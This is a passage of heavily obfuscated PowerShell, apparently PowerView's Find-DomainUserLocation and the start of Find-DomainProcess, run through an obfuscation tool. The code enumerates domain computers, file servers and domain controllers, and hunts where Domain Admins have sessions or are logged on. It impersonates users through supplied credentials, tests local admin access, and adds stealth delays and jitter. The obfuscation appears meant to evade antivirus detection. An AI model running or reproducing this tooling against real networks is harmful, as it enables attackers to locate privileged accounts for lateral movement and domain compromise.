                    ${fI`leser`Ve`RS} = &("{4}{1}{6}{2}{0}{5}{3}" -f 'File','D','ain','erver','Get-','S','om') @FileServerSearcherArguments
                    if (${FiLE`sE`R`VeRs} -isnot [System.Array]) { ${F`iLeS`ErV`erS} = @(${FiLeSeR`V`ers}) }
                    ${t`A`R`geTcomPUtERA`R`Raylist}.("{1}{0}{2}"-f 'n','AddRa','ge').Invoke( ${fIlE`S`eRvERS} )
                }
                if (${stEaLThs`O`URCe} -match ((("{0}{1}{2}" -f 'D','FSiy','2All'))-CrEPlACe ([Char]105+[Char]121+[Char]50),[Char]124)) {
                    &("{2}{1}{0}{3}{4}" -f'b','e-Ver','Writ','o','se') ("{5}{8}{7}{0}{3}{4}{2}{11}{6}{9}{12}{1}{10}"-f'ation] Que','r',' for DF','ryi','ng','[Find-DomainUse',' se','c','rLo','r','s','S','ve')
                    
                    
                }
                if (${s`TEaLTHS`our`cE} -match ((("{0}{2}{1}" -f'DCp','All','wa'))."R`eplace"('pwa',[stRing][cHAr]124))) {
                    &("{3}{4}{1}{2}{0}" -f'-Verbose','t','e','W','ri') ("{5}{2}{8}{9}{4}{1}{6}{0}{7}{3}"-f ' for domain',' Query','ind-D','ntrollers',']','[F','ing',' co','omainUserLocati','on')
                    ${dCSea`RcHERa`R`gUm`E`NTs} = @{
                        ("{1}{0}" -f 'P','LDA') = ${TR`Ue}
                    }
                    if (${psbound`paRA`me`TeRs}[("{1}{0}{2}"-f'ai','Dom','n')]) { ${DcS`e`Archera`R`gUmEnts}[("{0}{1}"-f 'Doma','in')] = ${DOMA`IN} }
                    if (${Ps`B`O`UndpaRAme`TerS}[("{3}{0}{1}{2}{4}"-f'om','p','ute','C','rDomain')]) { ${dCSE`ARChERA`RGuMe`NTS}[("{0}{1}" -f'D','omain')] = ${CoMPuTerdo`m`A`IN} }
                    if (${pSb`oUNDp`ARaMetE`RS}[("{0}{1}" -f 'Serve','r')]) { ${DcsE`ARc`hErA`RGUmEn`TS}[("{1}{0}"-f'ver','Ser')] = ${Ser`V`er} }
                    if (${PsBoun`DP`A`R`A`mETERS}[("{0}{2}{3}{1}"-f'Cr','ntial','e','de')]) { ${dCseaRc`h`EraRG`UmE`NTs}[("{0}{2}{1}"-f'Cre','ial','dent')] = ${cR`Ed`ENtIal} }
                    ${do`MA`I`NcONtrOllE`Rs} = &("{1}{2}{4}{0}{3}" -f'oma','G','et-','inController','D') @DCSearcherArguments | &("{3}{0}{2}{1}" -f 'lect','ct','-Obje','Se') -ExpandProperty ("{3}{2}{1}{0}"-f 'me','a','shostn','dn')
                    if (${DomAiNc`On`Tr`oll`ers} -isnot [System.Array]) { ${Dom`Ai`NcO`NtRoL`l`ErS} = @(${D`OMAIn`cO`NtRol`lERs}) }
                    ${t`A`R`GeTcomPUtE`Ra`RRAYLI`st}.("{0}{1}{2}"-f 'A','ddRa','nge').Invoke( ${DomAIN`coNtR`OL`LERS} )
                }
                ${tar`g`ETcOMp`Ute`Rs} = ${TA`R`gETCOMPUt`Er`Array`LiSt}.("{1}{2}{0}"-f 'ay','T','oArr').Invoke()
            }
            else {
                &("{2}{4}{1}{0}{3}" -f's','rbo','Wri','e','te-Ve') ("{12}{10}{1}{15}{14}{6}{11}{7}{8}{3}{5}{0}{4}{9}{2}{13}" -f'e','nUs','n the dom','ompu','rs ','t','cation] ','uerying f','or all c','i','i','Q','[Find-Doma','ain','rLo','e')
                ${TaRget`Co`mp`UtE`RS} = &("{4}{1}{5}{3}{0}{2}"-f'ut','-Domain','er','p','Get','Com') @ComputerSearcherArguments | &("{1}{3}{2}{0}" -f'ct','Se','-Obje','lect') -ExpandProperty ("{2}{3}{0}{1}"-f'hostnam','e','d','ns')
            }
        }
        &("{2}{0}{1}{3}" -f 'ri','te-V','W','erbose') "[Find-DomainUserLocation] TargetComputers length: $($TargetComputers.Length) "
        if (${T`ARGetC`OM`puters}."leNg`Th" -eq 0) {
            throw ("{8}{13}{4}{10}{5}{1}{3}{11}{12}{0}{2}{6}{7}{9}"-f 'd t','ati','o','on] ','omain','rLoc',' en','um','[Find','erate','Use','N','o hosts foun','-D')
        }

        
        if (${PSbo`U`Nd`PaRAme`TErS}[("{1}{2}{0}" -f'al','Creden','ti')]) {
            ${CuR`Re`Ntu`sER} = ${C`R`eDent`ial}.("{0}{2}{1}{4}{3}"-f 'G','NetworkCr','et','tial','eden').Invoke()."useRNA`Me"
        }
        else {
            ${CuRRENT`U`SeR} = ( ( gEt-IteM ('vaRi'+'AB'+'LE:Vxn'+'26J')).valUe::"uS`ERnAmE").("{0}{2}{1}"-f'ToLo','r','we').Invoke()
        }

        
        if (${pS`B`ouNDPARA`MetERs}[("{1}{2}{0}" -f'wAll','Sh','o')]) {
            ${t`ArgEt`U`SErS} = @()
        }
        elseif (${Ps`B`OUn`dP`ARamEters}[("{0}{1}{3}{2}"-f 'User','I','ty','denti')] -or ${pSboU`ND`p`ArA`METers}[("{4}{0}{3}{1}{2}" -f'serLDAPFi','t','er','l','U')] -or ${Ps`B`oU`NdpAraMETers}[("{2}{0}{3}{1}"-f'er','archBase','Us','Se')] -or ${PSboU`N`DPARamEtE`Rs}[("{1}{2}{0}{3}"-f 'o','U','serAdminC','unt')] -or ${PsBO`UN`dPaR`A`MetErS}[("{2}{3}{0}{1}" -f 'owDelegati','on','Us','erAll')]) {
            ${tAr`GEt`USERs} = &("{4}{0}{1}{3}{2}" -f 'ai','nUs','r','e','Get-Dom') @UserSearcherArguments | &("{2}{0}{1}"-f'ect','-Object','Sel') -ExpandProperty ("{2}{3}{1}{4}{0}" -f'ntname','c','sam','a','cou')
        }
        else {
            ${GROUPsear`cH`eRa`Rgum`e`NTS} = @{
                ("{2}{0}{1}"-f 't','y','Identi') = ${uS`eRgROu`p`IDE`NtItY}
                ("{0}{1}{2}" -f 'Rec','ur','se') = ${tr`Ue}
            }
            if (${p`Sbo`UndpaR`AMet`e`RS}[("{2}{0}{3}{1}"-f 's','n','U','erDomai')]) { ${G`RO`UPs`E`ARC`HEra`RgumEn`TS}[("{1}{0}"-f 'omain','D')] = ${uSe`RDo`m`Ain} }
            if (${psbo`UNDP`ARAmE`TErs}[("{2}{1}{0}{3}"-f'e','rS','Use','archBase')]) { ${GRoup`SEARcher`A`Rg`UmeNtS}[("{1}{0}{2}" -f'hBa','Searc','se')] = ${U`Se`RSEaRC`HBAsE} }
            if (${PSB`ound`p`Ar`AmETers}[("{1}{0}" -f'ver','Ser')]) { ${gRo`UP`SeArC`herArGuMEntS}[("{0}{1}" -f 'Ser','ver')] = ${Serv`Er} }
            if (${p`s`BoUnDpAr`AMe`T`eRS}[("{0}{1}{2}"-f'Se','archSc','ope')]) { ${groupSEaR`Ch`ErA`R`G`UmEN`Ts}[("{2}{3}{1}{0}" -f'cope','hS','Sear','c')] = ${s`EARChs`Co`pe} }
            if (${P`Sb`Ou`NDPaRAM`EtErS}[("{1}{3}{4}{2}{0}"-f'e','Result','iz','Pag','eS')]) { ${G`ROU`pSEArcH`EraRG`UM`enTS}[("{2}{1}{0}{3}"-f'PageS','sult','Re','ize')] = ${res`UltpAG`E`SIze} }
            if (${psbOUND`PA`RaMEt`eRs}[("{0}{1}{2}"-f 'ServerTim','e','Limit')]) { ${Gr`OUPSEARCh`ERa`RGUm`e`Nts}[("{0}{1}{3}{2}{4}"-f'Serve','r','mi','TimeLi','t')] = ${S`ERvE`RT`imeLimIt} }
            if (${P`s`BoUN`dpar`A`mEtERS}[("{2}{0}{1}"-f'o','ne','Tombst')]) { ${g`RO`UP`SEA`RcHeRaR`g`UmENTs}[("{1}{2}{0}{3}" -f 'on','Tom','bst','e')] = ${T`Omb`St`oNE} }
            if (${PSBOU`ND`pA`RA`me`TErS}[("{0}{1}{2}"-f'Cre','dent','ial')]) { ${GR`oU`PSea`RcHERAr`gUm`ents}[("{2}{1}{0}"-f'tial','reden','C')] = ${CRedeN`T`i`Al} }
            ${Ta`RgE`TuS`eRs} = &("{6}{0}{3}{4}{1}{2}{5}"-f '-D','p','Me','o','mainGrou','mber','Get') @GroupSearcherArguments | &("{3}{4}{1}{2}{0}" -f'bject','le','ct-O','S','e') -ExpandProperty ("{2}{0}{1}"-f 'erNa','me','Memb')
        }

        &("{1}{0}{2}" -f 'rite','W','-Verbose') "[Find-DomainUserLocation] TargetUsers length: $($TargetUsers.Length) "
        if ((-not ${S`hOw`All}) -and (${t`Arg`eTuS`ErS}."l`eNG`TH" -eq 0)) {
            throw ("{9}{7}{6}{11}{5}{1}{4}{2}{3}{12}{0}{10}{8}"-f'und','oc','on] No users',' f','ati','L','inUse','ma','o target','[Find-Do',' t','r','o')
        }

        
        ${H`O`STENumbLoCk} = {
            Param(${CO`MPUTeR`NaMe}, ${TAr`GeT`Use`Rs}, ${currEN`T`U`Ser}, ${STEaL`Th}, ${ToK`eNha`NdLe})

            if (${toke`N`H`ANdle}) {
                
                ${n`ULl} = &("{1}{5}{0}{2}{3}{4}" -f'rs','Invoke-UserI','o','nati','on','mpe') -TokenHandle ${t`o`KeN`HaNdle} -Quiet
            }

            ForEach (${TARgET`cOm`P`UTEr} in ${COmP`U`T`ErNaMe}) {
                ${U`p} = &("{3}{2}{0}{1}" -f't','ion','t-Connec','Tes') -Count 1 -Quiet -ComputerName ${T`AR`G`etComPutEr}
                if (${up}) {
                    ${Ses`S`ioNs} = &("{1}{0}{3}{2}" -f'-NetSes','Get','ion','s') -ComputerName ${TarGEt`CO`m`pu`TEr}
                    ForEach (${SE`SS`ION} in ${SE`S`SIo`Ns}) {
                        ${user`N`AMe} = ${Se`SsioN}."u`Se`RNAmE"
                        ${c`N`Ame} = ${Se`s`sIoN}."c`NAMe"

                        if (${Cna`Me} -and ${CNa`mE}.("{0}{2}{3}{1}"-f'S','sWith','t','art').Invoke('\\')) {
                            ${cn`Ame} = ${cN`AmE}.("{2}{1}{0}"-f 'art','t','TrimS').Invoke('\')
                        }

                        
                        if ((${use`Rn`AME}) -and (${U`SeR`NamE}.("{1}{0}" -f 'm','Tri').Invoke() -ne '') -and (${U`ser`NaME} -notmatch ${C`UR`RENTu`SER}) -and (${u`sER`NA`Me} -notmatch '\$$')) {

                            if ( (-not ${taR`g`EtUs`ERS}) -or (${Targ`etu`sE`RS} -contains ${USer`NAME})) {
                                ${U`serLoC`ATION} = &("{2}{0}{1}" -f 'je','ct','New-Ob') ("{1}{2}{0}" -f 't','PSObj','ec')
                                ${UsE`RlocaT`IoN} | &("{0}{2}{1}" -f 'A','d-Member','d') ("{3}{2}{0}{1}"-f'ert','y','prop','Note') ("{0}{1}{2}"-f 'Us','erDom','ain') ${nU`ll}
                                ${UsE`RLoca`TioN} | &("{2}{1}{0}{3}" -f'Membe','d-','Ad','r') ("{1}{0}{2}" -f'ope','Notepr','rty') ("{0}{1}{2}"-f 'User','Na','me') ${U`SeRnAMe}
                                ${user`lo`CAtI`on} | &("{0}{2}{3}{1}" -f 'Add-','mber','M','e') ("{0}{1}{2}"-f 'Note','p','roperty') ("{3}{2}{1}{0}"-f'e','puterNam','om','C') ${TarG`eTc`oMp`U`TeR}
                                ${uSe`RLO`c`AtI`ON} | &("{0}{1}{2}" -f'Add-Mem','b','er') ("{0}{1}{3}{2}" -f'Not','ep','rty','rope') ("{0}{3}{1}{2}" -f 'Sessi','ro','m','onF') ${CNa`mE}

                                
                                try {
                                    ${CNamE`dnsnA`mE} =  $7AP4Q::("{2}{1}{0}"-f 'stEntry','Ho','Get').Invoke(${cnA`me}) | &("{0}{3}{1}{2}" -f 'Se','ec','t-Object','l') -ExpandProperty ("{2}{1}{0}"-f'me','stNa','Ho')
                                    ${U`s`ErLOCAtiON} | &("{2}{0}{1}"-f'dd-','Member','A') ("{1}{2}{0}"-f'ty','NotePrope','r') ("{3}{1}{0}{2}" -f'ionFromNam','ess','e','S') ${cna`M`E`D`NsnAME}
                                }
                                catch {
                                    ${uSERlO`CA`TIoN} | &("{0}{1}{2}"-f'A','dd-Mem','ber') ("{1}{0}{2}" -f 'roper','NoteP','ty') ("{2}{4}{0}{3}{1}"-f 'o','ame','SessionF','mN','r') ${nU`Ll}
                                }

                                
                                if (${cHEcK`A`CcE`SS}) {
                                    ${a`dmIn} = (&("{0}{4}{1}{3}{2}"-f 'Te','m','ess','inAcc','st-Ad') -ComputerName ${Cn`A`me})."i`sADMin"
                                    ${uS`ErL`o`CatIon} | &("{0}{1}{2}" -f 'Add-Me','mb','er') ("{3}{0}{2}{1}"-f 'otepr','erty','op','N') ("{0}{1}{2}" -f 'L','ocal','Admin') ${A`DMiN}."I`sadmIn"
                                }
                                else {
                                    ${use`RLoCAtI`oN} | &("{2}{0}{1}{3}" -f'dd-','Mem','A','ber') ("{2}{0}{1}"-f 'e','property','Not') ("{0}{3}{2}{1}"-f 'L','min','lAd','oca') ${nu`ll}
                                }
                                ${USErLO`CATi`On}."Pso`BJEct"."tYp`En`A`mEs".("{1}{0}"-f'rt','Inse').Invoke(0, ("{1}{2}{0}{3}"-f 'er','Powe','rView.Us','Location'))
                                ${UsER`LoC`A`TIOn}
                            }
                        }
                    }
                    if (-not ${ST`EaL`TH}) {
                        
                        ${LOg`G`EdON} = &("{1}{0}{2}"-f 'et-Net','G','Loggedon') -ComputerName ${tAR`GEt`comPUT`ER}
                        ForEach (${U`seR} in ${LO`gG`EDoN}) {
                            ${uS`ER`NAmE} = ${u`SER}."Use`R`NamE"
                            ${Us`ER`domAIN} = ${US`ER}."LoG`O`NdoMain"

                            
                            if ((${USER`N`AME}) -and (${U`sER`NaME}.("{0}{1}" -f 'tr','im').Invoke() -ne '')) {
                                if ( (-not ${T`AR`GETusers}) -or (${TArgEt`U`sErS} -contains ${U`ser`NamE}) -and (${u`Se`RNa`Me} -notmatch '\$$')) {
                                    ${ipaDD`R`E`ss} = @(&("{3}{2}{0}{1}"-f'-IPAddre','ss','esolve','R') -ComputerName ${tarGETCoMPU`T`er})[0]."I`pa`DDReSs"
                                    ${us`eR`LoC`AtIoN} = &("{2}{0}{3}{1}"-f'w','t','Ne','-Objec') ("{0}{1}{2}" -f 'PSObj','ec','t')
                                    ${USer`lOc`A`TIoN} | &("{2}{1}{3}{0}" -f'r','m','Add-Me','be') ("{2}{1}{0}{3}" -f'tepropert','o','N','y') ("{1}{2}{0}"-f 'main','UserD','o') ${use`RdoM`A`in}
                                    ${u`S`ErLOca`TIoN} | &("{1}{0}{2}"-f 'd-','Ad','Member') ("{2}{3}{0}{1}" -f'r','operty','N','otep') ("{1}{0}"-f'me','UserNa') ${us`erN`AmE}
                                    ${uSeRL`oCat`IOn} | &("{0}{2}{1}"-f 'Add-Me','ber','m') ("{1}{2}{0}"-f'ty','Note','proper') ("{3}{1}{2}{0}" -f'erName','o','mput','C') ${tArgetc`o`mp`Ut`er}
                                    ${uS`Er`lO`CATion} | &("{1}{2}{0}"-f'Member','A','dd-') ("{3}{0}{2}{1}"-f'otepr','erty','op','N') ("{3}{1}{0}{2}" -f 'dr','d','ess','IPA') ${i`PaDd`ReSS}
                                    ${US`E`RLOcATioN} | &("{3}{2}{0}{1}"-f 'Me','mber','dd-','A') ("{1}{2}{3}{0}"-f'perty','Not','e','pro') ("{1}{2}{0}"-f 'sionFrom','S','es') ${N`UlL}
                                    ${u`serL`OcATION} | &("{0}{2}{1}" -f'A','mber','dd-Me') ("{1}{0}{2}" -f'o','N','teproperty') ("{0}{2}{1}" -f 'S','e','essionFromNam') ${N`ULl}

                                    
                                    if (${checKA`cc`E`Ss}) {
                                        ${A`d`MIN} = &("{2}{1}{0}{3}" -f'nAcc','-Admi','Test','ess') -ComputerName ${TaRgE`TC`om`PU`TEr}
                                        ${USERLOCAT`I`On} | &("{3}{0}{2}{1}"-f 'dd','er','-Memb','A') ("{1}{2}{0}" -f 'roperty','No','tep') ("{2}{0}{1}" -f 'calA','dmin','Lo') ${aDm`iN}."iS`Ad`mIn"
                                    }
                                    else {
                                        ${USERlOc`A`TiON} | &("{2}{1}{0}"-f'mber','dd-Me','A') ("{2}{0}{3}{1}"-f'otep','perty','N','ro') ("{1}{0}{2}"-f 'mi','LocalAd','n') ${n`UlL}
                                    }
                                    ${uS`er`L`Ocat`ion}."p`sObj`eCt"."TyP`eN`AmES".("{1}{0}"-f'sert','In').Invoke(0, ("{6}{3}{0}{4}{5}{2}{1}" -f 'ew','ocation','L','erVi','.Use','r','Pow'))
                                    ${uS`eRloCAt`I`oN}
                                }
                            }
                        }
                    }
                }
            }

            if (${TOK`EN`H`AnDLE}) {
                &("{1}{3}{0}{2}{5}{4}" -f'oke-Rev','I','ert','nv','elf','ToS')
            }
        }

        ${log`o`NtOKen} = ${n`ULl}
        if (${PSBOund`PARa`mEt`ERs}[("{0}{2}{1}"-f 'Crede','al','nti')]) {
            if (${p`SBOun`dPaR`AMETe`Rs}[("{1}{0}"-f 'y','Dela')] -or ${PS`B`OU`NdPar`AM`ETErs}[("{1}{3}{0}{2}"-f 'S','StopO','uccess','n')]) {
                ${lo`GonTO`Ken} = &("{1}{2}{0}{3}{4}"-f'oke','In','v','-','UserImpersonation') -Credential ${C`Red`e`NTIAl}
            }
            else {
                ${LoGoN`T`O`Ken} = &("{5}{7}{2}{4}{3}{6}{1}{0}"-f'n','tio','erIm','rso','pe','Inv','na','oke-Us') -Credential ${c`Red`eNT`IaL} -Quiet
            }
        }
    }

    PROCESS {
        
        if (${PSbound`paRameT`E`RS}[("{0}{1}" -f 'Del','ay')] -or ${P`SBOunDP`A`RamET`ers}[("{2}{1}{3}{0}"-f 'OnSuccess','to','S','p')]) {

            &("{1}{3}{0}{4}{2}" -f'b','Write-','se','Ver','o') "[Find-DomainUserLocation] Total number of hosts: $($TargetComputers.count) "
            &("{2}{0}{1}{3}"-f 'e-Ver','b','Writ','ose') ('['+'Fi'+'nd'+'-Domain'+'UserL'+'o'+'catio'+'n] '+'D'+'ela'+'y: '+"$Delay, "+'Jitter:'+' '+"$Jitter")
            ${c`oUNt`ER} = 0
            ${rAND`No} = &("{0}{1}{2}"-f 'Ne','w','-Object') ("{3}{0}{4}{1}{2}" -f 'ys','.Ra','ndom','S','tem')

            ForEach (${tAR`Ge`TC`Omp`UTeR} in ${tar`gE`TcO`mPUtErS}) {
                ${Cou`NTeR} = ${c`O`UNTeR} + 1

                
                &("{1}{3}{2}{0}" -f'Sleep','S','art-','t') -Seconds ${Ra`Ndno}.("{1}{0}" -f'xt','Ne').Invoke((1-${jI`TteR})*${D`El`AY}, (1+${JI`T`TEr})*${De`lAy})

                &("{3}{1}{2}{0}" -f 'e','rite-Verbo','s','W') "[Find-DomainUserLocation] Enumerating server $Computer ($Counter of $($TargetComputers.Count)) "
                &("{1}{3}{4}{2}{0}"-f'mand','In','-Com','vok','e') -ScriptBlock ${hoStEn`UMB`l`oCk} -ArgumentList ${TA`RGe`TCom`putER}, ${tArGEt`U`se`Rs}, ${cu`RrE`Nt`USEr}, ${s`T`EalTH}, ${Lo`g`ontokEn}

                if (${Res`U`lt} -and ${stOp`o`NsUC`CeSs}) {
                    &("{2}{3}{1}{0}"-f'e','-Verbos','Writ','e') ("{11}{6}{4}{1}{0}{10}{2}{5}{12}{9}{7}{3}{8}"-f'rL','se','n] Tar','urning ','nU','get us','Find-Domai',' ret','early','ound,','ocatio','[','er f')
                    return
                }
            }
        }
        else {
            &("{0}{1}{3}{2}"-f 'Write-Ve','r','e','bos') ('[F'+'ind'+'-Do'+'mainUse'+'rL'+'ocation'+'] '+'Usin'+'g'+' '+'t'+'hreadin'+'g '+'with'+' '+'threa'+'d'+'s:'+' '+"$Threads")
            &("{2}{0}{1}{3}"-f'rb','os','Write-Ve','e') "[Find-DomainUserLocation] TargetComputers length: $($TargetComputers.Length) "

            
            ${ScRipTPA`Ra`MS} = @{
                ("{1}{2}{0}" -f's','TargetUs','er') = ${t`ARG`eTUS`erS}
                ("{2}{0}{1}" -f 'ntU','ser','Curre') = ${cUR`ReN`T`UseR}
                ("{1}{0}"-f'tealth','S') = ${sT`ea`lth}
                ("{1}{2}{0}{3}" -f 'n','T','okenHa','dle') = ${l`ogO`NTOK`En}
            }

            
            &("{0}{4}{3}{2}{1}"-f 'Ne','n','Functio','Threaded','w-') -ComputerName ${tARG`e`TC`om`PuTERS} -ScriptBlock ${hos`Te`Numb`LOcK} -ScriptParameters ${scRIpT`Pa`RAmS} -Threads ${THRea`dS}
        }
    }

    END {
        if (${l`OgOnTo`ken}) {
            &("{3}{0}{2}{5}{1}{4}" -f'ke','e','-Reve','Invo','lf','rtToS') -TokenHandle ${L`ogO`Nto`KeN}
        }
    }
}


function fI`ND`-doMAI`NpROC`ESS {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{1}{2}" -f'PS','ShouldProce','ss'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{4}{2}{3}{0}{1}"-f 'lT','ype','Credent','ia','PSUsePS'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{7}{3}{8}{6}{0}{2}{4}{5}"-f'sw','PSA','o','in','r','d','as','voidUsingPla','TextForP'}, '')]
    [OutputType({"{3}{0}{2}{1}" -f'er','iew.UserProcess','V','Pow'})]
    [CmdletBinding(DefAuLTpaRamEteRSeTNAmE = {"{1}{0}"-f'e','Non'})]
    Param(
        [Parameter(poSITion = 0, ValuefRompiPELINe = ${T`RuE}, VaLUEFrOMPiPELInEbYPROpeRtynamE = ${tr`UE})]
        [Alias({"{0}{2}{1}"-f 'D','ame','NSHostN'})]
        [String[]]
        ${C`O`mPuteR`NA`me},

        [ValidateNotNullOrEmpty()]
        [String]
        ${dom`AIN},

        [ValidateNotNullOrEmpty()]
        [String]
        ${COMpUT`E`RDoMaIN},

        [ValidateNotNullOrEmpty()]
        [String]
        ${C`o`MpUTErlD`ApfIl`Ter},

        [ValidateNotNullOrEmpty()]
        [String]
        ${Co`mpUTe`RseArC`H`BA`Se},

        [Alias({"{2}{0}{1}"-f'ncons','trained','U'})]
        [Switch]
        ${COMPUt`eRU`NCO`NsT`R`AIneD},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{3}{0}" -f 'System','Ope','rati','ng'})]
        [String]
        ${comP`UTero`p`E`R`ATiNGSYSTeM},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{1}{2}{0}" -f'ePack','v','ic','Ser'})]
        [String]
        ${CoMPUTe`RSErvI`cEp`Ack},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{2}"-f'teN','Si','ame'})]
        [String]
        ${COmpu`TERs`I`TenAMe},

        [Parameter(PArAMetERSETnAMe = "tARge`Tp`ROce`sS")]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${PR`O`ceSSN`Ame},

        [Parameter(pARAmeTeRSetNAme = "t`A`RGetu`sEr")]
        [Parameter(pARametErSETnaMe = "useRIDE`NT`iTY")]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${uSErI`D`ENtI`TY},

        [Parameter(ParAMeteRSeTnAME = "t`A`RGetUsER")]
        [ValidateNotNullOrEmpty()]
        [String]
        ${USERDoM`A`IN},

        [Parameter(pArAMetErSeTname = "TaR`GEt`USeR")]
        [ValidateNotNullOrEmpty()]
        [String]
        ${USe`RLDAp`F`ilT`ER},

        [Parameter(pArAMEtersEtnaMe = "t`ARg`eTUs`ER")]
        [ValidateNotNullOrEmpty()]
        [String]
        ${u`s`ErSEaRchB`ASE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}" -f 'Name','p','Grou'}, {"{0}{1}"-f'G','roup'})]
        [String[]]
        ${uSergrOu`pi`dENTi`TY} = ("{1}{2}{0}{3}{4}"-f'Ad','Do','main ','mi','ns'),

        [Parameter(paraMeterSEtNAMe = "T`ARg`e`TuseR")]
        [Alias({"{0}{2}{1}{3}" -f 'A','inCo','dm','unt'})]
        [Switch]
        ${US`erAdMin`cO`UNt},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}{2}" -f'Domain','Controll','er'})]
        [String]
        ${ser`VER},

        [ValidateSet({"{1}{0}" -f 'e','Bas'}, {"{2}{0}{1}" -f'eLev','el','On'}, {"{0}{1}"-f'S','ubtree'})]
        [String]
        ${s`eaRch`SCO`pE} = ("{0}{2}{1}"-f 'S','ee','ubtr'),

        [ValidateRange(1, 10000)]
        [Int]
        ${RE`su`lTp`A`geSize} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${S`E`RVe`RtIMel`iM`it},

        [Switch]
        ${tOm`BS`ToNE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`REdeN`TI`AL} =  (gi ("v"+"aRi"+"aB"+"lE:21gV7E")  ).vALUE::"e`MpTy",

        [Switch]
        ${S`TopOnSUCC`esS},

        [ValidateRange(1, 10000)]
        [Int]
        ${D`ELAy} = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        ${jiT`TEr} = .3,

        [Int]
        [ValidateRange(1, 100)]
        ${t`HREADS} = 20
    )

    BEGIN {
        ${coMPuT`erSEa`RCh`ERaR`G`UMeN`TS} = @{
            ("{2}{0}{1}" -f 'roperti','es','P') = ("{2}{1}{0}{3}" -f'a','n','dnshost','me')
        }
        if (${psb`Oundp`ArAMEt`ErS}[("{0}{1}"-f 'Domai','n')]) { ${coMPu`TerSea`RC`H`eRar`GUMeNtS}[("{1}{0}{2}" -f'o','D','main')] = ${DOM`AIN} }
        if (${PS`Bou`NDPA`Ram`eTE`RS}[("{0}{2}{3}{1}" -f 'Co','rDomain','mp','ute')]) { ${cOMPu`T`erse`A`RChERA`RGumEnts}[("{1}{0}"-f'main','Do')] = ${COmpUT`e`RDoM`A`In} }
        if (${PSBOU`N`DPaR`Am`ETE`RS}[("{4}{0}{2}{5}{1}{3}"-f 'm','LDAPFilte','pu','r','Co','ter')]) { ${CoM`pUTe`RsearCh`Erar`guMeNTs}[("{1}{0}{2}" -f 'ilte','LDAPF','r')] = ${Comp`Uter`lDAPfil`TEr} }
        if (${PsBoUNd`p`ArAm`ETe`RS}[("{1}{4}{3}{0}{5}{2}"-f 'e','Comp','SearchBase','t','u','r')]) { ${Com`putErSea`RCHE`RArgU`MentS}[("{0}{1}{2}"-f 'Sear','chB','ase')] = ${comp`U`T`er`SeaRChbase} }
        if (${P`SBou`NDPAr`Ame`Te`RS}[("{2}{1}{3}{0}" -f'ed','nstra','Unco','in')]) { ${cOmPUtEr`s`eArcHERa`RGUmEN`Ts}[("{1}{2}{0}"-f'ined','Un','constra')] = ${UNC`O`NstRaI`NED} }
        if (${pS`BoUnd`p`Ar`AMet`eRs}[("{5}{3}{2}{0}{4}{1}"-f 'atingSy','m','uterOper','mp','ste','Co')]) { ${c`oMPuTer`sEarch`erA`RG`UMENtS}[("{0}{2}{1}{3}{4}"-f 'Ope','ti','ra','ngS','ystem')] = ${OPE`Rat`i`N`GsySTEM} }
        if (${pSb`OuN`dparA`METeRS}[("{0}{1}{2}{3}"-f'Compute','rServic','ePa','ck')]) { ${cOM`putE`RsEARCHE`RArGuMe`N`Ts}[("{1}{2}{0}"-f 'cePack','S','ervi')] = ${S`erv`iC`EPAcK} }
        if (${pSbOu`NDParA`M`ET`e`RS}[("{1}{0}{3}{2}" -f'erSit','Comput','ame','eN')]) { ${COMPutE`Rse`ArCH`er`AR`GUMEn`TS}[("{1}{0}" -f 'iteName','S')] = ${si`TeNA`mE} }
        if (${pSb`ou`Ndp`AraMETERS}[("{1}{0}"-f 'ver','Ser')]) { ${C`oMPUTeRseARCHeR`AR`guMe`NTS}[("{0}{1}"-f 'Serve','r')] = ${s`er`VeR} }
        if (${PSB`OunDP`ARAM`ETERS}[("{3}{0}{1}{2}"-f'ch','S','cope','Sear')]) { ${compu`Te`Rs`EA`Rc`heraRG`UMENts}[("{3}{1}{0}{2}" -f'hSco','c','pe','Sear')] = ${sEARCh`S`CopE} }
        if (${psbo`UnDPArA`M`Ete`RS}[("{0}{1}{2}" -f 'R','esultPag','eSize')]) { ${C`O`mpuTErSE`ARC`herArGu`M`EnTS}[("{2}{1}{0}" -f'ze','sultPageSi','Re')] = ${reS`UlT`p`Age`SiZE} }
        if (${psbOU`Nd`PARAME`T`ErS}[("{4}{1}{2}{0}{3}" -f'Li','i','me','mit','ServerT')]) { ${CoMPuT`e`RSEa`RChe`R`AR`gUMeNtS}[("{1}{0}{4}{2}{3}" -f'e','Serv','mi','t','rTimeLi')] = ${Serv`Er`TiM`eLIM`iT} }
        if (${p`SBOUn`D`PARamEt`ErS}[("{0}{2}{1}"-f'T','one','ombst')]) { ${C`O`M`p`UTe`R`SearcHe`RaRg`UMEnTs}[("{0}{1}{2}" -f'T','omb','stone')] = ${TOmb`s`T`ONe} }
        if (${ps`BO`UndparaMete`RS}[("{1}{0}{2}"-f'redent','C','ial')]) { ${COMp`UTerseAR`cHEr`ARgu`m`enTS}[("{2}{3}{0}{1}" -f 'nti','al','C','rede')] = ${cRe`dEnTi`Al} }

        ${USe`RsE`ARCHeRargu`m`E`N`Ts} = @{
            ("{2}{0}{1}{3}" -f 'er','t','Prop','ies') = ("{1}{3}{2}{0}"-f'me','s','na','amaccount')
        }
        if (${Psbo`UNdpar`AM`ete`RS}[("{2}{0}{1}" -f 'e','rIdentity','Us')]) { ${uSERSea`RChe`Ra`R`gUmentS}[("{2}{1}{0}"-f'y','tit','Iden')] = ${u`S`eRidENti`TY} }
        if (${Ps`BOuND`pA`RaMET`e`Rs}[("{0}{2}{1}" -f'D','n','omai')]) { ${Us`E`Rs`eARchE`RaRGuMeNts}[("{1}{0}" -f 'ain','Dom')] = ${d`Oma`in} }
